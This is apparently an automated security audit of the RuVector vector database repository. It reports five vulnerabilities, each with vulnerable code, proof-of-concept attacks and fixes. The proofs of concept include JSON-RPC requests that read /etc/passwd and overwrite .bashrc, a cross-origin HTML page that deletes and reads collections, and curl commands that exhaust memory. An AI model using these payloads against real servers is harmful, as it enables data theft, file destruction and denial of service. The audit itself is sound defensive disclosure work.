# RuVector Security Audit Report

**Date:** 2025-02-25  
**Auditor:** Automated Security Analysis  
**Scope:** Full codebase audit of `ruvector` repository  
**Version:** 0.1.2  

---

## Executive Summary

This report documents security vulnerabilities identified in the RuVector codebase through static analysis and manual code review. The audit focused on the REST API server, MCP protocol handlers, CLI tools, unsafe Rust code, and external process execution. **5 actionable vulnerabilities** were identified, with 1 Critical, 2 High, and 2 Medium severity findings.

---

## Vulnerability Summary

| ID | Severity | Component | Title |
|----|----------|-----------|-------|
| RV-2025-001 | **Critical** | ruvector-cli (MCP) | Arbitrary File Read/Write via Path Traversal in `tool_backup` |
| RV-2025-002 | **High** | ruvector-server | Unrestricted CORS Configuration Allows Cross-Origin Attacks |
| RV-2025-003 | **High** | ruvector-server | Unbounded Request Body Size Enables Memory Exhaustion DoS |
| RV-2025-004 | **Medium** | ruvector-server | Missing Authentication on All API Endpoints |
| RV-2025-005 | **Medium** | ruvector-cli (MCP) | Internal Error Details Leaked to Client |

---

## Detailed Findings

### RV-2025-001: Arbitrary File Read/Write via Path Traversal in `tool_backup`

**Severity:** Critical  
**CVSS v3.1:** 9.1 (Critical)  
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

**Affected File:** `crates/ruvector-cli/src/mcp/handlers.rs`  
**Affected Lines:** 461–466

#### Description

The `tool_backup` function in the MCP handler accepts both `db_path` and `backup_path` directly from user-controlled JSON-RPC input. These paths are passed directly to `std::fs::copy()` without any validation, canonicalization, or confinement to an allowed directory.

An attacker with MCP tool access can:
1. **Read arbitrary files** by setting `db_path` to any file on the filesystem (e.g., `/etc/shadow`, `~/.ssh/id_rsa`) and `backup_path` to an attacker-accessible location.
2. **Write/overwrite arbitrary files** by setting `backup_path` to critical system or application files.

#### Vulnerable Code

```rust
// crates/ruvector-cli/src/mcp/handlers.rs, lines 461-466
async fn tool_backup(&self, args: &Value) -> Result<String> {
    let params: BackupParams = serde_json::from_value(args.clone())?;

    // VULNERABILITY: Both paths come directly from user input with no validation
    std::fs::copy(&params.db_path, &params.backup_path)
        .context("Failed to backup database")?;

    Ok(format!("Backed up to: {}", params.backup_path))
}
```

Additionally, the path traversal issue extends to all database operations (`tool_create_db`, `tool_insert`, `tool_search`, `tool_stats`, and `get_or_open_db`) which accept `db_path` or `path` parameters without validation:

```rust
// Line 391: tool_create_db
db_options.storage_path = params.path.clone();  // Unsanitized

// Line 478: get_or_open_db
db_options.storage_path = path.to_string();     // Unsanitized
```

#### Proof of Concept

**MCP JSON-RPC Request - Arbitrary File Read:**
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "vector_db_backup",
    "arguments": {
      "db_path": "/etc/passwd",
      "backup_path": "/tmp/stolen_passwd"
    }
  }
}
```

**MCP JSON-RPC Request - Arbitrary File Overwrite:**
```json
{
  "jsonrpc": "2.0",
  "id": 2,
  "method": "tools/call",
  "params": {
    "name": "vector_db_backup",
    "arguments": {
      "db_path": "/dev/zero",
      "backup_path": "/home/user/.bashrc"
    }
  }
}
```

**MCP JSON-RPC Request - Path Traversal in DB Creation:**
```json
{
  "jsonrpc": "2.0",
  "id": 3,
  "method": "tools/call",
  "params": {
    "name": "vector_db_create",
    "arguments": {
      "path": "../../../../tmp/malicious_db",
      "dimensions": 128
    }
  }
}
```

#### Impact

- **Confidentiality:** An attacker can read any file the process has access to (SSH keys, configuration files, credentials, database files).
- **Integrity:** An attacker can overwrite arbitrary files, potentially achieving code execution or denial of service.
- **Availability:** Overwriting critical application or system files causes service disruption.

#### Remediation

1. Validate and canonicalize all paths using `std::fs::canonicalize()`.
2. Enforce a whitelist of allowed base directories.
3. Reject paths containing `..` components before canonicalization.
4. Ensure both source and destination paths resolve within the allowed directory.

```rust
fn validate_path(path: &str, allowed_base: &Path) -> Result<PathBuf> {
    let path = PathBuf::from(path);
    // Reject obvious traversal attempts before canonicalization
    for component in path.components() {
        if matches!(component, std::path::Component::ParentDir) {
            return Err(anyhow::anyhow!("Path traversal detected"));
        }
    }
    let canonical = allowed_base.join(&path)
        .canonicalize()
        .context("Failed to resolve path")?;
    if !canonical.starts_with(allowed_base) {
        return Err(anyhow::anyhow!("Path outside allowed directory"));
    }
    Ok(canonical)
}
```

---

### RV-2025-002: Unrestricted CORS Configuration

**Severity:** High  
**CVSS v3.1:** 7.5 (High)  
**CWE:** CWE-942 (Overly Permissive Cross-domain Whitelist)

**Affected File:** `crates/ruvector-server/src/lib.rs`  
**Affected Lines:** 84–89

#### Description

The server configures CORS to allow any origin, any method, and any header. This is enabled by default (`enable_cors: true` in `Config::default()`). This permits cross-origin requests from any website, enabling an attacker to make requests to the RuVector API from a malicious web page visited by a victim.

#### Vulnerable Code

```rust
// crates/ruvector-server/src/lib.rs, lines 84-89
if self.config.enable_cors {
    let cors = CorsLayer::new()
        .allow_origin(Any)    // Any origin allowed
        .allow_methods(Any)   // Any HTTP method allowed
        .allow_headers(Any);  // Any header allowed
    router = router.layer(cors);
}
```

#### Proof of Concept

An attacker hosts this page. When a victim who has access to the RuVector server visits it, the attacker can read collection data, create/delete collections, and insert/search vectors:

```html
<!DOCTYPE html>
<html>
<head><title>RuVector CORS Exploit</title></head>
<body>
<script>
  // Target: RuVector server accessible to the victim
  const API = 'http://localhost:6333';

  // Step 1: List all collections (information disclosure)
  fetch(`${API}/collections`)
    .then(r => r.json())
    .then(data => {
      console.log('Collections:', data);
      document.body.innerHTML += '<pre>Collections: ' + JSON.stringify(data) + '</pre>';
    });

  // Step 2: Delete a collection (destructive action)
  fetch(`${API}/collections/important_data`, { method: 'DELETE' })
    .then(r => console.log('Deleted collection:', r.status));

  // Step 3: Create a malicious collection
  fetch(`${API}/collections`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ name: 'pwned', dimension: 128 })
  }).then(r => r.json()).then(d => console.log('Created:', d));
</script>
</body>
</html>
```

#### Impact

- Combined with the lack of authentication (RV-2025-004), any website can perform full CRUD operations on all collections and vectors.
- An attacker can exfiltrate vector data (which may contain sensitive embeddings representing private documents).
- An attacker can delete or corrupt data.

#### Remediation

Replace `Any` with specific allowed origins:

```rust
use tower_http::cors::AllowOrigin;

let cors = CorsLayer::new()
    .allow_origin(AllowOrigin::list(vec![
        "http://localhost:3000".parse().unwrap(),
    ]))
    .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
    .allow_headers([header::CONTENT_TYPE, header::AUTHORIZATION]);
```

---

### RV-2025-003: Unbounded Request Body Size Enables Memory Exhaustion DoS

**Severity:** High  
**CVSS v3.1:** 7.5 (High)  
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

**Affected Files:**  
- `crates/ruvector-server/src/routes/points.rs` (lines 17–19, 65–74)
- `crates/ruvector-server/src/routes/collections.rs` (line 63)

#### Description

Multiple API endpoints accept unbounded user input without any size limits:

1. **`PUT /collections/:name/points`** — The `UpsertPointsRequest.points` field is a `Vec<VectorEntry>` with no maximum size. An attacker can send millions of vectors in a single request.

2. **`POST /collections/:name/points/search`** — The `SearchRequest.k` field accepts any `usize` value (default 10, but overridable). Setting `k` to `usize::MAX` forces the server to attempt returning all stored vectors.

3. **`POST /collections`** — The `CreateCollectionRequest.dimension` accepts any `usize` value. Creating a collection with `dimension: 999999999` could cause extreme memory allocation on first vector insertion.

4. **No request body size limit** — The axum server has no `DefaultBodyLimit` layer configured, allowing arbitrarily large HTTP request bodies.

#### Vulnerable Code

```rust
// points.rs - No limit on batch size
pub struct UpsertPointsRequest {
    pub points: Vec<VectorEntry>,  // Unbounded
}

// points.rs - No upper bound on k
pub struct SearchRequest {
    pub vector: Vec<f32>,          // Unbounded vector dimension
    #[serde(default = "default_limit")]
    pub k: usize,                  // No max, default 10 but overridable
    // ...
}

// collections.rs - No dimension limit
pub struct CreateCollectionRequest {
    pub dimension: usize,          // No maximum
    // ...
}
```

#### Proof of Concept

**Memory Exhaustion via Large Batch Insert:**
```bash
# Generate a 1GB+ payload with millions of vectors
python3 -c "
import json
vectors = []
for i in range(1000000):
    vectors.append({'id': str(i), 'vector': [0.1]*128})
print(json.dumps({'points': vectors}))
" | curl -X PUT http://localhost:6333/collections/test/points \
  -H 'Content-Type: application/json' -d @-
```

**Memory Exhaustion via Large k:**
```bash
curl -X POST http://localhost:6333/collections/test/points/search \
  -H 'Content-Type: application/json' \
  -d '{"vector": [0.1, 0.2, 0.3], "k": 18446744073709551615}'
```

**Memory Exhaustion via Large Dimension:**
```bash
curl -X POST http://localhost:6333/collections \
  -H 'Content-Type: application/json' \
  -d '{"name": "huge", "dimension": 999999999}'
```

#### Impact

- Server process runs out of memory and crashes (OOM kill).
- Denial of service for all users.
- Potential resource exhaustion on the host system.

#### Remediation

1. Add `DefaultBodyLimit` to the axum router:
```rust
use axum::extract::DefaultBodyLimit;
router = router.layer(DefaultBodyLimit::max(10 * 1024 * 1024)); // 10MB
```

2. Validate request parameters:
```rust
const MAX_BATCH_SIZE: usize = 10_000;
const MAX_DIMENSION: usize = 65_536;
const MAX_K: usize = 10_000;

// In upsert_points handler:
if req.points.len() > MAX_BATCH_SIZE {
    return Err(Error::InvalidRequest("Batch size exceeds limit".into()));
}

// In create_collection handler:
if req.dimension > MAX_DIMENSION || req.dimension == 0 {
    return Err(Error::InvalidRequest("Invalid dimension".into()));
}

// In search_points handler:
let k = req.k.min(MAX_K);
```

---

### RV-2025-004: Missing Authentication on All API Endpoints

**Severity:** Medium  
**CVSS v3.1:** 5.3 (Medium)  
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Affected File:** `crates/ruvector-server/src/lib.rs`  
**Affected Lines:** 70–75

#### Description

All REST API endpoints are accessible without any form of authentication. There is no API key, bearer token, mTLS, or other authentication mechanism. Anyone who can reach the server's network port can create, read, update, and delete all collections and vectors.

While this is acceptable for local development, the default configuration binds to `127.0.0.1:6333` which partially mitigates remote access. However:
- The `host` is configurable and could be set to `0.0.0.0`.
- Container/cloud deployments often expose services publicly.
- Combined with the CORS vulnerability (RV-2025-002), even local-only services can be attacked via browser-based CSRF.

#### Vulnerable Code

```rust
// crates/ruvector-server/src/lib.rs, lines 69-75
fn build_router(&self) -> Router {
    let mut router = Router::new()
        .route("/health", get(routes::health::health_check))
        .route("/ready", get(routes::health::readiness))
        .nest("/collections", routes::collections::routes())
        .merge(routes::points::routes())
        .with_state(self.state.clone());
    // No authentication middleware applied
}
```

#### Impact

- Any network-reachable client can perform all operations.
- Data exfiltration, corruption, or deletion is possible without credentials.
- Risk is amplified by CORS misconfiguration (RV-2025-002).

#### Remediation

Add bearer token authentication middleware:

```rust
use axum::middleware;

async fn auth_middleware(
    req: axum::http::Request<axum::body::Body>,
    next: axum::middleware::Next,
) -> Result<axum::response::Response, StatusCode> {
    let token = req.headers()
        .get("Authorization")
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "));

    match token {
        Some(t) if t == std::env::var("RUVECTOR_API_KEY").unwrap_or_default() => {
            Ok(next.run(req).await)
        }
        _ => Err(StatusCode::UNAUTHORIZED),
    }
}

// Apply to router:
router = router.layer(middleware::from_fn(auth_middleware));
```

---

### RV-2025-005: Internal Error Details Leaked to Client

**Severity:** Medium  
**CVSS v3.1:** 5.3 (Medium)  
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Affected Files:**  
- `crates/ruvector-server/src/error.rs` (lines 53–75)
- `crates/ruvector-cli/src/mcp/handlers.rs` (line 308)

#### Description

Error responses in both the REST API server and MCP handler expose internal error details directly to clients. The server's `IntoResponse` implementation for `Error` passes the full error string to the JSON response body. In the MCP handler, `anyhow` error chains (which may include file paths, database internals, and stack context) are forwarded to the JSON-RPC error response.

#### Vulnerable Code

**REST API Server:**
```rust
// crates/ruvector-server/src/error.rs, lines 53-75
impl IntoResponse for Error {
    fn into_response(self) -> Response {
        let (status, error_message) = match self {
            // Full internal error messages exposed:
            Error::Core(e) => (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()),
            Error::Server(_) | Error::Internal(_) => {
                (StatusCode::INTERNAL_SERVER_ERROR, self.to_string())
            }
            // ...
        };
        let body = Json(json!({
            "error": error_message,  // Leaked to client
            "status": status.as_u16(),
        }));
        (status, body).into_response()
    }
}
```

**MCP Handler:**
```rust
// crates/ruvector-cli/src/mcp/handlers.rs, line 306-308
Err(e) => McpResponse::error(
    id,
    McpError::new(error_codes::INTERNAL_ERROR, e.to_string()),
    // Full anyhow error chain exposed
),
```

#### Proof of Concept

```bash
# Trigger an internal error that exposes path information
curl -X POST http://localhost:6333/collections \
  -H 'Content-Type: application/json' \
  -d '{"name": "test", "dimension": 0}'
# Response may include internal error: "Core error: Failed to initialize storage at /path/to/..."
```

#### Impact

- Reveals internal file paths, database structure, library versions, and system configuration.
- Assists attackers in crafting targeted exploits.
- May reveal sensitive information in error context (e.g., connection strings).

#### Remediation

Return generic error messages for internal errors while logging full details server-side:

```rust
Error::Core(e) => {
    tracing::error!("Core error: {}", e);
    (StatusCode::INTERNAL_SERVER_ERROR, "Internal server error".to_string())
}
```

---

## Items Reviewed and Found Secure

| Component | Finding |
|-----------|---------|
| **Unsafe Rust blocks** (SIMD, arena, memory pool, mmap) | All audited unsafe blocks include proper bounds validation, alignment checks, and safety documentation. No memory safety bugs found. |
| **SQL injection** (ruvector-postgres) | Uses PGRX framework with parameterized queries. No raw SQL string concatenation. |
| **Command injection** (claude_flow_bridge) | Proper validation via `validate_cli_arg()` that rejects shell metacharacters. Uses `Command::new()` with argument vector, not shell string. |
| **install.sh** | Uses HTTPS-only for Rust installation. No privilege escalation. Safe platform detection. |
| **Hardcoded secrets** | No hardcoded API keys, passwords, or credentials found in source code. |
| **Deserialization** | Uses serde with type-directed deserialization. No arbitrary type instantiation. |
| **Mmap operations** (ruvector-gnn) | Proper bounds checking and RwLock protection. |
| **Arena allocators** (ruvector-core, ruvector-solver) | Overflow protection, alignment validation, and capacity bounds. |

---

## Risk Matrix

| Vulnerability | Likelihood | Impact | Risk |
|---------------|-----------|--------|------|
| RV-2025-001 (Path Traversal) | High (MCP is user-facing) | Critical (arbitrary file R/W) | **Critical** |
| RV-2025-002 (CORS) | High (default config) | High (cross-site data theft) | **High** |
| RV-2025-003 (DoS) | High (trivial to exploit) | High (service disruption) | **High** |
| RV-2025-004 (No Auth) | Medium (network access needed) | High (full data access) | **Medium** |
| RV-2025-005 (Info Leak) | Medium (error triggered) | Low (aids further attacks) | **Medium** |

---

## Recommendations Priority

1. **Immediate (P0):** Fix path traversal in MCP backup handler (RV-2025-001)
2. **High (P1):** Restrict CORS to specific origins (RV-2025-002)
3. **High (P1):** Add request body size limits and parameter validation (RV-2025-003)
4. **Medium (P2):** Add authentication middleware (RV-2025-004)
5. **Medium (P2):** Sanitize error messages for clients (RV-2025-005)

---

## Appendix: Files Analyzed

| Crate | Files Analyzed |
|-------|---------------|
| ruvector-server | `lib.rs`, `error.rs`, `state.rs`, `routes/collections.rs`, `routes/points.rs`, `routes/health.rs` |
| ruvector-cli | `mcp/handlers.rs`, `cli/hooks.rs`, `config.rs`, `main.rs` |
| mcp-gate | `tools.rs`, `server.rs`, `types.rs`, `main.rs`, `lib.rs` |
| ruvector-core | `arena.rs`, `simd_intrinsics.rs`, `quantization.rs`, `cache_optimized.rs` |
| ruvector-solver | `arena.rs`, `simd.rs`, `types.rs` |
| ruvector-graph | `optimization/memory_pool.rs`, `optimization/simd_traversal.rs`, `executor/operators.rs` |
| ruvector-gnn | `mmap.rs`, `cold_tier.rs`, `lib.rs` |
| ruvllm | `context/claude_flow_bridge.rs`, `hub/download.rs`, `hub/upload.rs`, `kernels/*.rs` |
| cognitum-gate-kernel | `shard.rs`, `delta.rs`, `evidence.rs`, `lib.rs` |
| ruvector-postgres | `distance/simd.rs`, `types/*.rs`, `healing/worker.rs`, `dag/hooks.rs` |
| rvf | `rvf-wasm/src/*.rs`, `rvf-ebpf/src/lib.rs`, `rvf-launch/src/*.rs` |
